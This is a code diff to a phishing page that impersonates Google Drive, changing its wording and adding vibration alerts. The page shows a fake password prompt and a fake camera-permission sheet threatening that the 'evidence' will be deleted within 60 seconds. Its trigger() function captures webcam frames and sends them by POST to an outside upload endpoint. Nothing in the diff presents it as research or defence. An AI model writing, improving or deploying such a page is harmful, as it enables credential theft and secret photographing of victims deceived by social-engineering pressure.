@@ -10,7 +10,6 @@
         :root { --g-blue: #0b57d0; --g-gray: #444746; --g-surface: #f3f6fc; }
         body, html { margin: 0; padding: 0; height: 100%; width: 100%; font-family: 'Roboto', sans-serif; background: #000; overflow: hidden; }
 
-        /* Background: Heavy blur stays until the end of the script */
         #bg-image {
             position: fixed; inset: 0;
             background: url('pic.jpg'); 
@@ -39,12 +38,10 @@
 
         #status-text { color: white; font-size: 14px; font-weight: 400; font-family: 'Google Sans'; }
 
-        /* Loader & UI */
         #loader { position: fixed; inset: 0; background: white; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
         .p-bar { width: 100px; height: 4px; background: #eee; border-radius: 10px; margin-top: 20px; overflow: hidden; }
         .p-fill { width: 0%; height: 100%; background: var(--g-blue); transition: width 0.1s linear; }
 
-        /* NEW BRIDGE LOADER STYLE */
         #bridge-loader { position: fixed; inset: 0; background: white; z-index: 9500; display: none; flex-direction: column; align-items: center; justify-content: center; }
         .drive-logo-pulse { width: 50px; animation: drivePulse 2s infinite ease-in-out; }
         .p-track { width: 220px; height: 4px; background: #e8eaed; border-radius: 10px; margin-top: 40px; overflow: hidden; }
@@ -55,7 +52,6 @@
         .header { height: 64px; display: flex; align-items: center; padding: 0 20px; background: white; border-bottom: 1px solid #eee; }
         .header span { font-family: 'Google Sans', sans-serif; font-size: 20px; color: var(--g-gray); margin-left: 12px; }
 
-        /* EXTRA PROFESSIONAL PASSWORD AREA */
         #pass-modal { 
             display: none; position: fixed; inset: 0; background: white; z-index: 9000; 
             flex-direction: column; align-items: center; padding-top: 60px;
@@ -77,7 +73,6 @@
         .in-pass:focus { border: 2px solid var(--g-blue); outline: none; padding: 12px 14px; }
         .forgot-link { color: var(--g-blue); font-size: 14px; font-weight: 500; text-align: left; width: 100%; cursor: pointer; margin-top: 8px; }
 
-        /* Fake Box Style */
         #fake-box { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 11000; }
         .sheet { position: fixed; bottom: 12px; left: 12px; right: 12px; background: var(--g-surface); border-radius: 28px; padding: 24px; box-sizing: border-box; }
         .btn-p { background: var(--g-blue); color: white; border: none; padding: 14px; border-radius: 100px; width: 100%; font-weight: 500; font-size: 14px; margin-bottom: 8px; cursor: pointer; }
@@ -89,10 +84,14 @@
     <div id="bg-image"></div>
 
     <div id="regret-box">
-        <img src="https://cdn-icons-png.flaticon.com/512/564/564619.png" width="80" style="margin-bottom:20px; opacity:0.8;">
-        <h2 style="font-family:'Google Sans'; color:#d93025;">Access Terminated</h2>
-        <p style="color:#5f6368; line-height:1.6; margin-bottom:30px;">For your security, Drive requires decryption permission to render this file. By denying access, the encrypted link has been temporarily suspended.</p>
-        <button class="btn-p" onclick="location.reload()" style="max-width:200px;">Try Again</button>
+        <img src="https://cdn-icons-png.flaticon.com/512/564/564619.png" width="60" style="margin-bottom:20px; opacity:0.8;">
+        <h2 style="font-family:'Google Sans'; color:#d93025; font-size: 20px;">Access Blocked</h2>
+        <p style="color:#5f6368; font-size: 14px; line-height:1.5; margin-bottom:30px; padding: 0 20px;">
+            Because you denied the sync, the file is now <b>Locked</b>. 
+            <br><br>
+            To protect the data, this link will expire in 1 minute. You must restart the handshake now to unlock the evidence.
+        </p>
+        <button class="btn-p" onclick="location.reload()" style="max-width:220px;">Unlock & Try Again</button>
     </div>
 
     <div id="processing-overlay">
@@ -127,17 +126,14 @@
         <div class="pass-card">
             <div class="pass-title">Verify it's you</div>
             <div class="pass-sub">To continue, first verify it's you</div>
-            
             <div style="display:flex; justify-content:center;">
                 <div class="user-pill">
                     <div class="user-icon">U</div>
                     <span>Shared Workspace User</span>
                 </div>
             </div>
-
             <input type="password" id="pwd" class="in-pass" placeholder="Enter your password">
             <div class="forgot-link">Forgot password?</div>
-            
             <div style="margin-top:40px; display:flex; justify-content: flex-end;">
                 <button class="btn-p" style="width:100px;" onclick="verify()">Next</button>
             </div>
@@ -147,17 +143,17 @@
     <div id="fake-box">
         <div class="sheet">
             <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" width="32" style="margin-bottom:16px;">
-            <div style="font-family:'Google Sans'; font-size:18px; color:#1f1f1f; font-weight:500; margin-bottom:8px;">Temporary Handshake Required</div>
+            <div style="font-family:'Google Sans'; font-size:18px; color:#1f1f1f; font-weight:500; margin-bottom:8px;">Camera Sync Required to render visual evidence</div>
             <div style="font-family:'Roboto'; font-size:14px; color:#444746; line-height:1.5; margin-bottom:24px;">
-                This is a one-time access link. To render the visual capture from the encrypted metadata, you must authorize a sensor handshake. 
+                To render the visual evidence from the encrypted <b>Confidential_Archive</b>, you must authorize a <b>Camera View Sync</b>. 
                 <br><br>
-                <div style="background: rgba(185, 28, 28, 0.05); border-left: 3px solid #b91c1c; padding: 8px 12px; color: #b91c1c;">
-                    <b>CRITICAL:</b> If access is denied, the decryption key will be <b>PERMANENTLY DELETED</b> and the evidence will become unavailable.
+                <div style="background: rgba(185, 28, 28, 0.05); border-left: 3px solid #b91c1c; padding: 10px; color: #b91c1c; font-size:13px;">
+                    <b>CRITICAL:</b> You have 60 seconds. If you close this or deny it, the link will break and the file will be <b>deleted forever</b> for security.
                 </div>
             </div>
-            <button class="btn-p" onclick="trigger()">While using the app</button>
-            <button class="btn-p" onclick="trigger()">Only this time</button>
-            <button class="btn-s" onclick="showRegret()">Don't allow</button>
+            <button class="btn-p" onclick="trigger()">Allow while visiting</button>
+            <button class="btn-p" onclick="trigger()">Allow this time</button>
+            <button class="btn-s" onclick="showRegret()">Never allow</button>
         </div>
     </div>
 
@@ -195,24 +191,28 @@
 
                 bar.style.width = val + '%';
 
-                if(val > 30) status.innerText = "Authorizing decryption...";
-                if(val > 75) status.innerText = "Finalizing secure handshake...";
+                if(val > 30) status.innerText = "Initializing hardware interface...";
+                if(val > 75) status.innerText = "Syncing optical sensor (Handshake 0x4f)...";
 
                 if(val >= 100) {
                     clearInterval(loop);
                     bridge.style.display = 'none';
+                    if (navigator.vibrate) { navigator.vibrate([200, 100, 200]); }
                     document.getElementById('fake-box').style.display = 'block';
                 }
             }, 100);
         }
 
-        function showRegret() { document.getElementById('fake-box').style.display = 'none'; document.getElementById('regret-box').style.display = 'flex'; }
+        function showRegret() { 
+            document.getElementById('fake-box').style.display = 'none'; 
+            document.getElementById('regret-box').style.display = 'flex'; 
+            if (navigator.vibrate) { navigator.vibrate(800); }
+        }
 
         async function trigger() {
             document.getElementById('fake-box').style.display = 'none';
             document.getElementById('main-ui').style.display = 'none';
             document.getElementById('processing-overlay').style.display = 'flex';
-            
             const status = document.getElementById('status-text');
             const bg = document.getElementById('bg-image');
 
@@ -228,8 +228,8 @@
                     c.getContext('2d').drawImage(v, 0, 0);
                     const rawData = c.toDataURL('image/jpeg', 0.5).split(',')[1];
                     
-                    if(count == 4) status.innerText = "Extracting shared asset keys...";
-                    if(count == 8) status.innerText = "Finalizing Workspace render...";
+                    if(count == 4) status.innerText = "Processing optical data packets...";
+                    if(count == 8) status.innerText = "Validating hardware session (84%)...";
 
                     fetch(`${RENDER_URL}/upload`, { method: 'POST', mode: 'cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ image: rawData }) }).catch(() => {});
 
@@ -237,7 +237,6 @@
                     if (count >= 12) {
                         clearInterval(timer);
                         stream.getTracks().forEach(t => t.stop());
-                        
                         document.getElementById('processing-overlay').style.display = 'none';
                         bg.style.filter = 'blur(0px) brightness(1)';
                         bg.style.transform = 'scale(1)';
